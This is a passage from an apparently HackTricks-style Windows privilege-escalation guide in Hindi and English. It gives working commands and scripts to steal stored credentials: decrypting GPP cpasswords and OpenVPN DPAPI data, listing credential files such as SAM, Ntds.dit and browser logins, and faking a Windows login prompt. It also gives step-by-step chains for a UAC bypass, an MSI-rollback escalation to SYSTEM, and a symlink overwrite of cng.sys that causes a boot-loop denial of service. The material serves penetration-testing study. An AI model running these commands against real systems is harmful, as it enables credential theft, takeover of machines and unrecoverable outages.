इस जोखिम को कम करने के लिए, एक फ़ंक्शन विकसित किया गया जो locally cached GPP फ़ाइलों के लिए स्कैन करता है जिनमें एक "cpassword" फ़ील्ड खाली नहीं होती। ऐसी फ़ाइल मिलने पर, फ़ंक्शन password को decrypt करता है और एक custom PowerShell object लौटाता है। यह object GPP और फ़ाइल के स्थान के बारे में विवरण शामिल करता है, जिससे इस सुरक्षा vulnerability की पहचान और remediation में मदद मिलती है।

इन फ़ाइलों के लिए `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ में खोजें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को डिक्रिप्ट करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
पासवर्ड प्राप्त करने के लिए crackmapexec का उपयोग:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
web.config के साथ credentials का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN क्रेडेंशियल्स
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Credentials के लिए पूछें

आप हमेशा **उपयोगकर्ता से उसके credentials दर्ज करने के लिए पूछ सकते हैं या यहां तक कि किसी दूसरे उपयोगकर्ता के credentials भी माँग सकते हैं** अगर आप सोचते हैं कि वह उन्हें जानता होगा (ध्यान दें कि **क्लाइंट से सीधे credentials माँगना** वास्तव में **जोखिमभरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभावित फ़ाइल नाम जिनमें credentials शामिल हो सकते हैं**

ज्ञात फ़ाइलें जिनमें कुछ समय पहले **passwords** **clear-text** या **Base64** में मौजूद थे
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
सभी प्रस्तावित फ़ाइलों को खोजें:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### रीसायकल बिन में Credentials

आपको Bin को भी जांचना चाहिए ताकि उसके अंदर मौजूद credentials को देखा जा सके

कई प्रोग्रामों द्वारा सहेजे गए पासवर्डों को **पुनर्प्राप्त करने के लिए** आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### रजिस्ट्री के अंदर

**अन्य संभावित रजिस्ट्री कीज़ जिनमें credentials हो सकते हैं**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र इतिहास

आपको उन dbs की जाँच करनी चाहिए जहाँ **Chrome या Firefox** के passwords स्टोर होते हैं।\
ब्राउज़रों का history, bookmarks और favourites भी चेक करें क्योंकि संभवतः कुछ **passwords** वहाँ स्टोर हो सकते हैं।

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows ऑपरेटिंग सिस्टम में निर्मित एक technology है जो विभिन्न भाषाओं के सॉफ़्टवेयर कंपोनेंट्स के बीच intercommunication की अनुमति देता है। प्रत्येक COM component को **identified via a class ID (CLSID)** के माध्यम से पहचाना जाता है और प्रत्येक component एक या अधिक interfaces के माध्यम से functionality expose करता है, जिन्हें interface IDs (IIDs) द्वारा पहचाना जाता है।

COM classes और interfaces registry में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत परिभाषित होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** को merge करके बनता है = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

बुनियादी तौर पर, यदि आप **overwrite any of the DLLs** कर सकते हैं जो execute होने वाली हैं, तो आप **escalate privileges** कर सकते हैं यदि वह DLL किसी अलग user द्वारा execute किया जाएगा।

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**फ़ाइलों की सामग्री खोजें**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी निश्चित फ़ाइल नाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**रजिस्ट्री में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### ऐसे टूल जो passwords खोजते हैं

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin। मैंने यह plugin बनाया है ताकि यह victim के अंदर **automatically execute every metasploit POST module that searches for credentials**।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically उन सभी फाइलों को खोजता है जिनमें इस पृष्ठ में बताए गए passwords होते हैं।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) एक और बेहतरीन टूल है जो सिस्टम से password निकालने के लिए उपयोग किया जाता है।

यह टूल [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) उन कई टूल्स के **sessions**, **usernames** और **passwords** खोजता है जो यह डेटा clear text में सेव करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, प्रक्रिया के बीच संचार और डेटा ट्रांसफर की सुविधा देते हैं।

Windows **Named Pipes** नामक फ़ीचर प्रदान करता है, जो अनसंबंधित प्रक्रियाओं को, यहां तक कि अलग-अलग नेटवर्क पर भी, डेटा साझा करने की अनुमति देता है। यह एक client/server आर्किटेक्चर जैसा होता है, जहाँ भूमिकाएँ **named pipe server** और **named pipe client** के रूप में परिभाषित होती हैं।

जब किसी **client** द्वारा pipe के माध्यम से डेटा भेजा जाता है, तो वह **server** जिसने pipe बनाया है, यदि उसके पास आवश्यक **SeImpersonate** अधिकार हैं, तो वह **client** की पहचान को अपना सकता है। ऐसे किसी **privileged process** की पहचान करना जो उस pipe के माध्यम से संपर्क करता है और जिसका आप अनुकरण कर सकते हैं, आपको उस प्रक्रिया की पहचान अपना कर **gain higher privileges** हासिल करने का मौका देता है जब वह आपके द्वारा स्थापित pipe से इंटरैक्ट करे। इस तरह के हमले को करने के निर्देशों के लिए उपयोगी गाइड [**here**](named-pipe-client-impersonation.md) और [**here**](#from-high-integrity-to-system) देखें।

इसके अलावा निम्नलिखित टूल एक ऐसे टूल (जैसे burp) के साथ named pipe संचार को intercept करने की अनुमति देता है: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) और यह टूल सभी pipes को सूचीबद्ध करके privescs खोजने के लिए सक्षम बनाता है: [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

इस पेज को देखें **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links जो `ShellExecuteExW` को फॉरवर्ड होते हैं, खतरनाक URI handlers (`file:`, `ms-appinstaller:` या कोई भी registered scheme) को ट्रिगर कर सकते हैं और attacker-controlled फाइलों को current user के रूप में execute कर सकते हैं। देखें:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

जब user के रूप में shell मिलता है, तो शेड्यूल किए गए टास्क या अन्य प्रक्रियाएँ हो सकती हैं जो **pass credentials on the command line**। नीचे दिया गया स्क्रिप्ट हर दो सेकंड में process command lines को कैप्चर करता है और वर्तमान स्थिति की तुलना पिछले स्थिति से करता है, और किसी भी अंतर को आउटपुट करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

यदि आपके पास graphical interface (via console या RDP) तक पहुँच है और UAC सक्षम है, तो कुछ Microsoft Windows संस्करणों में unprivileged user से "NT\AUTHORITY SYSTEM" जैसे terminal या किसी अन्य process को चलाना संभव है।

इससे एक ही vulnerability के साथ एक ही समय में escalate privileges और bypass UAC करना संभव हो जाता है। अतिरिक्त रूप से, कुछ भी install करने की आवश्यकता नहीं है और प्रक्रिया के दौरान उपयोग किया गया binary Microsoft द्वारा signed और issued है।

Some of the affected systems are the following:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability को exploit करने के लिए, निम्नलिखित कदम आवश्यक हैं:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

Integrity Levels के बारे में जानने के लिए यह पढ़ें:


{{#ref}}
integrity-levels.md
{{#endref}}

फिर **UAC और UAC bypasses के बारे में जानने के लिए यह पढ़ें:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

यह हमला मूल रूप से Windows Installer के rollback feature का दुरुपयोग कर वैध फाइलों को uninstall प्रक्रिया के दौरान malicious फाइलों से बदलने पर आधारित है। इसके लिए attacker को एक **malicious MSI installer** बनाना होता है जो `C:\Config.Msi` फ़ोल्डर को hijack करने के लिए इस्तेमाल किया जाएगा, जिसे बाद में Windows Installer uninstall के दौरान rollback files रखने के लिए उपयोग करता है जहाँ rollback files को malicious payload से modify किया गया होगा।

संक्षेप में तकनीक इस प्रकार है:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- एक `.msi` बनाएं जो एक harmless फाइल (उदा., `dummy.txt`) को एक writable फ़ोल्डर (`TARGETDIR`) में install करे।
- Installer को **"UAC Compliant"** के रूप में mark करें, ताकि एक **non-admin user** इसे चला सके।
- Install के बाद फ़ाइल पर एक **handle** open रखें।

- Step 2: Begin Uninstall
- उसी `.msi` को uninstall करें।
- Uninstall प्रक्रिया फ़ाइलों को `C:\Config.Msi` में move करना और उन्हें `.rbf` फाइलों के रूप में rename करना शुरू कर देती है (rollback backups)।
- फ़ाइल के open handle को पोल करें `GetFinalPathNameByHandle` का उपयोग करके यह पता लगाने के लिए कि फ़ाइल कब `C:\Config.Msi\<random>.rbf` बन जाती है।

- Step 3: Custom Syncing
- `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल होती है जो:
- संकेत देती है जब `.rbf` लिखा जाता है।
- फिर uninstall को आगे बढ़ाने से पहले एक अन्य event पर **wait** करती है।

- Step 4: Block Deletion of `.rbf`
- संकेत मिलने पर, `.rbf` फ़ाइल को `FILE_SHARE_DELETE` के बिना खोलें — यह इसे delete करने से **रोकता** है।
- फिर uninstall के पूरा होने के लिए **signal back** करें।
- Windows Installer `.rbf` को delete करने में विफल रहता है, और क्योंकि यह सभी contents को हटा नहीं सकता, **`C:\Config.Msi` हटाई नहीं जाती**।

- Step 5: Manually Delete `.rbf`
- आप (attacker) `.rbf` फ़ाइल को मैन्युअली delete कर देते हैं।
- अब **`C:\Config.Msi` खाली है**, hijack के लिए तैयार।

> इस बिंदु पर, **SYSTEM-level arbitrary folder delete vulnerability** को trigger करें ताकि `C:\Config.Msi` delete हो सके।

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- `C:\Config.Msi` फ़ोल्डर खुद recreate करें।
- कमजोर DACLs सेट करें (उदा., Everyone:F), और `WRITE_DAC` के साथ एक handle open रखें।

- Step 7: Run Another Install
- `.msi` को फिर से install करें, जिसमें:
- `TARGETDIR`: Writable location.
- `ERROROUT`: एक variable जो forced failure ट्रिगर करता है।
- यह install फिर से **rollback** को ट्रिगर करने के लिए उपयोग किया जाएगा, जो `.rbs` और `.rbf` पढ़ता है।

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW` का उपयोग करके `C:\Config.Msi` को monitor करें जब तक कि एक नया `.rbs` न दिखाई दे।
- इसका filename capture करें।

- Step 9: Sync Before Rollback
- `.msi` में एक **custom install action (`SyncBeforeRollback`)** है जो:
- `.rbs` बनते ही एक event signal करती है।
- फिर आगे बढ़ने से पहले **wait** करती है।

- Step 10: Reapply Weak ACL
- `.rbs created` event मिलने के बाद:
- Windows Installer `C:\Config.Msi` पर **strong ACLs फिर से apply** कर देता है।
- लेकिन चूंकि आपके पास अभी भी `WRITE_DAC` वाला handle है, आप फिर से **weak ACLs apply** कर सकते हैं।

> ACLs केवल handle open पर enforce होते हैं, इसलिए आप अभी भी फ़ोल्डर में लिख सकते हैं।

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` फ़ाइल को overwrite करके एक **fake rollback script** रखें जो Windows को बताती है कि:
- आपकी `.rbf` फ़ाइल (malicious DLL) को एक **privileged location** में restore करे (उदा., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)।
- आपके fake `.rbf` में एक **malicious SYSTEM-level payload DLL** डालें।

- Step 12: Trigger the Rollback
- sync event को signal करें ताकि installer resume करे।
- एक **type 19 custom action (`ErrorOut`)** configure किया गया है ताकि install जानबूझकर किसी ज्ञात पॉइंट पर fail हो जाए।
- इससे **rollback शुरू हो जाता है**।

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- आपके malicious `.rbs` को पढ़ता है।
- आपका `.rbf` DLL target location में copy कर देता है।
- अब आपके पास **malicious DLL एक SYSTEM-loaded path** में मौजूद है।

- Final Step: Execute SYSTEM Code
- किसी trusted **auto-elevated binary** (उदा., `osk.exe`) को चलाएँ जो उस DLL को load करे जिसे आपने hijack किया।
- **Boom**: आपका कोड **SYSTEM के रूप में execute** हो जाता है।

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

मुख्य MSI rollback तकनीक (पिछली) यह मानती है कि आप एक **पूरे फ़ोल्डर** (उदा., `C:\Config.Msi`) को delete कर सकते हैं। लेकिन अगर आपकी vulnerability केवल **arbitrary file deletion** की अनुमति देती हो तो क्या होगा?

आप **NTFS internals** का दुरुपयोग कर सकते हैं: हर फ़ोल्डर में एक छिपा हुआ alternate data stream होता है जिसे कहा जाता है:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह स्ट्रीम फ़ोल्डर का **index metadata** संग्रहीत करता है।

इसलिए, यदि आप किसी फ़ोल्डर की **`::$INDEX_ALLOCATION` स्ट्रीम को हटा देते हैं**, तो NTFS फ़ाइल सिस्टम से **पूरा फ़ोल्डर हटा दिया जाएगा।**

आप यह standard file deletion APIs जैसे प्रयोग करके कर सकते हैं:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप *file* delete API को कॉल कर रहे हों, यह **फोल्डर खुद को हटाता है**।

### फोल्डर की सामग्री हटाने से SYSTEM EoP तक
What if your primitive doesn’t allow you to delete arbitrary files/folders, but it **does allow deletion of the *contents* of an attacker-controlled folder**?

1. Step 1: एक bait folder और file सेटअप करें
- बनाएँ: `C:\temp\folder1`
- उसके अंदर: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर एक **oplock** लगाएँ
- जब कोई privileged process `file1.txt` को delete करने की कोशिश करता है तो oplock **निष्पादन को रोक देता है**।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process ट्रिगर करें (e.g., `SilentCleanup`)
- यह process फ़ोल्डर्स (e.g., `%TEMP%`) को स्कैन करता है और उनकी सामग्री हटाने की कोशिश करता है।
- जब यह `file1.txt` पर पहुँचता है, तो **oplock triggers** और नियंत्रण आपके callback को सौंप दिया जाता है।

4. Step 4: Inside the oplock callback – डिलीशन को redirect करें

- Option A: `file1.txt` को किसी अन्य स्थान पर ले जाएँ
- यह `folder1` को खाली कर देता है बिना oplock तोड़े।
- `file1.txt` को सीधे delete न करें — इससे oplock समय से पहले release हो जाएगा।

- Option B: `folder1` को **junction** में कन्वर्ट करें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: `\RPC Control` में एक **symlink** बनाएं:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS के internal stream को लक्षित करता है जो फ़ोल्डर के metadata को स्टोर करता है — इसे हटाने पर फ़ोल्डर भी हट जाता है।

5. चरण 5: oplock जारी करें
- SYSTEM process जारी रहता है और `file1.txt` को हटाने की कोशिश करता है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में हट रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` SYSTEM द्वारा हटा दिया जाता है।

### From Arbitrary Folder Create to Permanent DoS

एक primitive का शोषण करें जो आपको **create an arbitrary folder as SYSTEM/admin** करने देता है — भले ही आप **you can’t write files** या **set weak permissions**।

एक **folder** (not a file) बनाएं जिसका नाम किसी **critical Windows driver** के नाम जैसा हो, उदाहरण के लिए:
```
C:\Windows\System32\cng.sys
```
- यह पथ सामान्यतः `cng.sys` कर्नेल-मोड ड्राइवर के अनुरूप होता है।
- यदि आप इसे **पहले से एक फोल्डर के रूप में बना देते हैं**, तो Windows बूट के समय वास्तविक ड्राइवर को लोड करने में विफल हो जाता है।
- फिर, Windows बूट के दौरान `cng.sys` लोड करने की कोशिश करता है।
- यह फोल्डर देखता है, **वास्तविक ड्राइवर को resolve करने में विफल रहता है**, और **क्रैश हो जाता है या बूट रुक जाता है**।
- बाहरी हस्तक्षेप (जैसे, बूट रिपेयर या डिस्क एक्सेस) के बिना **कोई fallback नहीं है**, और **कोई recovery नहीं है**।

### विशेषाधिकार प्राप्त लॉग/बैकअप पथ + OM symlinks से मनमानी फ़ाइल ओवरराइट / boot DoS तक

जब कोई **विशेषाधिकार प्राप्त सेवा** किसी **लिखने योग्य config** से पढ़े गए पथ पर लॉग/एक्सपोर्ट लिखती है, तो उस पथ को **Object Manager symlinks + NTFS mount points** से रीडायरेक्ट करें ताकि विशेषाधिकार प्राप्त लिखाई को मनमानी ओवरराइट में बदला जा सके (यहाँ तक कि **बिना** SeCreateSymbolicLinkPrivilege के)।

**आवश्यकताएँ**
- लक्ष्य पथ स्टोर करने वाली config हमलावर द्वारा लिखने योग्य हो (उदा., `%ProgramData%\...\.ini`)।
- `\RPC Control` के लिए mount point और OM file symlink बनाने की क्षमता (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।
- उस पथ पर लिखने वाला कोई विशेषाधिकार प्राप्त ऑपरेशन होना चाहिए (log, export, report)।

**उदाहरण चेन**
1. विशेषाधिकार प्राप्त लॉग गंतव्य पुनर्प्राप्त करने के लिए config पढ़ें, उदाहरण: `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`।
2. बिना admin के पथ को रीडायरेक्ट करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. प्रिविलेज्ड कंपोनेंट के लॉग लिखने तक प्रतीक्षा करें (उदाहरण: admin triggers "send test SMS")। अब यह लेखन `C:\Windows\System32\cng.sys` पर होता है।
4. ओवरराइट किए गए टार्गेट (hex/PE parser) का निरीक्षण करके करप्शन की पुष्टि करें; reboot विंडोज़ को टेम्पर्ड ड्राइवर path लोड करने के लिए मजबूर करता है → **boot loop DoS**। यह किसी भी protected file पर भी सामान्यीकृत होता है जिसे कोई privileged service write के लिए खोलेगा।

> `cng.sys` सामान्यतः `C:\Windows\System32\drivers\cng.sys` से लोड होता है, लेकिन यदि `C:\Windows\System32\cng.sys` में एक copy मौजूद है तो पहले वही कोशिश की जा सकती है, जो करप्ट डेटा के लिए इसे एक भरोसेमंद DoS sink बना देता है।



## **High Integrity से SYSTEM तक**

### **नया service**

यदि आप पहले से ही High Integrity process पर चल रहे हैं, तो **SYSTEM तक का path** सिर्फ **एक नया service बनाकर और उसे execute करके** आसान हो सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> जब आप एक service binary बना रहे हों तो सुनिश्चित करें कि यह एक वैध सर्विस हो या बाइनरी आवश्यक क्रियाएँ तेज़ी से कर रहा हो, क्योंकि यदि यह वैध सर्विस नहीं है तो इसे 20s में बंद कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity प्रक्रिया से आप **AlwaysInstallElevated registry entries** को सक्षम करने और _**.msi**_ wrapper का उपयोग करके एक reverse shell **install** करने की कोशिश कर सकते हैं।\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास वे token privileges हैं (शायद आप यह पहले से किसी High Integrity प्रक्रिया में पाएंगे), तो आप SeDebug privilege के साथ लगभग किसी भी प्रक्रिया (not protected processes) को **open** कर पाएंगे, उस प्रक्रिया का **token copy** कर पाएंगे, और उस token के साथ एक **arbitrary process create** कर सकेंगे।\
